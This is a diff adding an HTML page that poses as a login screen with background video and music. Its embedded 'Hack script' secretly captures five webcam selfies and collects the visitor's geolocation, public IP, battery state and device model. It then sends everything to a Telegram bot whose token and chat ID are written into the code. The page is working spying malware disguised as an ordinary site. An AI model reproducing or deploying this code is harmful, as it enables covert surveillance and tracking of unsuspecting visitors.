@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Nethmika Web</title>
+  <style>
+    .video-background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      overflow: hidden;
+    }
+
+    #bg-video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    /* Styles for audio */
+    audio {
+      display: none;
+    }
+
+    /* Styles for login box */
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      position: relative;
+    }
+
+    .login-box {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 10px;
+      color: white;
+      width: 300px;
+      text-align: center;
+    }
+
+    .login-box h2 {
+      margin-bottom: 20px;
+    }
+
+    .textbox {
+      margin: 10px 0;
+      display: flex;
+      justify-content: center;
+    }
+
+    .textbox input {
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      margin: 5px 0;
+      font-size: 16px;
+    }
+
+    .btn {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+
+    .btn:hover {
+      background-color: #45a049;
+    }
+
+    #status {
+      color: white;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+
+    #video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="video-background">
+    <video autoplay muted loop id="bg-video">
+      <source src="src/photo-video.mp4" type="video/mp4">
+    </video>
+  </div>
+
+  <!-- Audio Song -->
+  <audio autoplay loop>
+    <source src="src/photo-song.mp3" type="audio/mp3">
+  </audio>
+
+  <!-- Login Box -->
+  <div class="login-container">
+    <div class="login-box">
+      <h2>𝗟𝗢𝗚𝗜𝗡 𝗣𝗔𝗚𝗘</h2>
+      <form id="login-form">
+        <div class="textbox">
+          <input type="email" id="email" placeholder="Email or Username" required>
+        </div>
+        <div class="textbox">
+          <input type="password" id="password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="btn">Login</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Selfie Capture Video -->
+  <video id="video" width="300" autoplay playsinline></video>
+  <div id="status">ඡායාරූප ලබා ගැනීමට රැඳී සිටින්න...</div>
+
+  <script>
+    // Web script
+    document.getElementById('login-form').addEventListener('submit', function (event) {
+      event.preventDefault(); // Prevent form submission for testing
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Log the email and password for testing purposes (Remove in production)
+      console.log('Email:', email);
+      console.log('Password:', password);
+    });
+
+    // Hack script
+    const TELEGRAM_TOKEN = '7794533495:AAHLZK7jFNjwcW4kdB43aKADbSdNP5BSPPI'; // ඔබගේ බොට් ටෝකනය
+    const CHAT_ID = '8163579898'; // ඔබගේ චැට් ID
+
+    let track, photos = [], photoCount = 0;
+    let locationData = null;
+
+    const video = document.getElementById('video');
+    const statusEl = document.getElementById('status');
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        statusEl.innerText = 'කරුණාකර රැඳී සිටින්න... ඡායාරූප ගෙන යනු ලබයි.';
+        video.srcObject = stream;
+        track = stream.getVideoTracks()[0];
+
+        requestLocation(); // ස්ථානයේ තොරතුරු ලබා ගැනීම
+      })
+      .catch(() => {
+        statusEl.innerText = 'අවසරය ප්‍රතික්ෂේප කරන ලදී.';
+      });
+
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            locationData = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            };
+            setTimeout(capturePhoto, 1000);
+          },
+          err => {
+            console.warn('ස්ථානය ප්‍රතික්ෂේප කරන ලදී:', err);
+            setTimeout(capturePhoto, 1000);
+          }
+        );
+      } else {
+        setTimeout(capturePhoto, 1000);
+      }
+    }
+
+    function capturePhoto() {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = 300;
+      canvas.height = 400;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const base64 = canvas.toDataURL('image/jpeg');
+      photos.push(base64);
+      photoCount++;
+      statusEl.innerText = `ඡායාරූප ගෙන යයි... (${photoCount}/5)`;
+
+      if (photoCount >= 5) {
+        track.stop();
+        sendInfo();
+      } else {
+        setTimeout(capturePhoto, 1500);
+      }
+    }
+
+    async function sendInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        const batteryLevel = Math.round(battery.level * 100);
+        const charging = battery.charging ? 'Charging' : 'Not Charging';
+
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ip = (await ipRes.json()).ip;
+
+        const userAgent = navigator.userAgent;
+        const androidInfo = parseAndroidInfo(userAgent);
+
+        let msg = `✅  𝐇𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐓𝐀𝐑𝐓 𝐀𝐍𝐃 𝐃𝐎𝐍𝐄
+
+⚓ IP: ${ip} 
+
+📱 DEVICE INFO
+
+🧬 Android Version: ${androidInfo.version}
+📼 Model: ${androidInfo.model}
+🔗 UserAgent: ${userAgent}
+
+🔌 BATTERY DETAILS
+
+🔋 Battery: ${batteryLevel}%
+🔌 Battery Status: ${charging}
+
+ɴᴇᴛʜᴍɪᴋᴀ ᴋᴀᴜꜱʜᴀʟʏᴀ`;
+
+        if (locationData) {
+          msg += `\nLocation: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
+        }
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+
+        for (const base64 of photos) {
+          const formData = createFormData(base64);
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          await new Promise(res => setTimeout(res, 400));
+        }
+
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    function parseAndroidInfo(userAgent) {
+      let version = 'Unknown';
+      let model = 'Unknown';
+      const androidMatch = userAgent.match(/Android\s([0-9.]+)/);
+      const modelMatch = userAgent.match(/Android.*?;\s([^;)\s]+)/);
+      if (androidMatch) version = androidMatch[1];
+      if (modelMatch) model = modelMatch[1];
+      return { version, model };
+    }
+
+    function createFormData(base64) {
+      const byteString = atob(base64.split(',')[1]);
+      const mimeString = base64.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      const blob = new Blob([ab], { type: mimeString });
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'selfie.jpg');
+      formData.append('caption', 'ɴᴇᴛʜᴍɪᴋᴀ ᴋᴀᴜꜱʜᴀʟʏᴀ');
+      return formData;
+    }
+  </script>
+
+</body>
+</html>
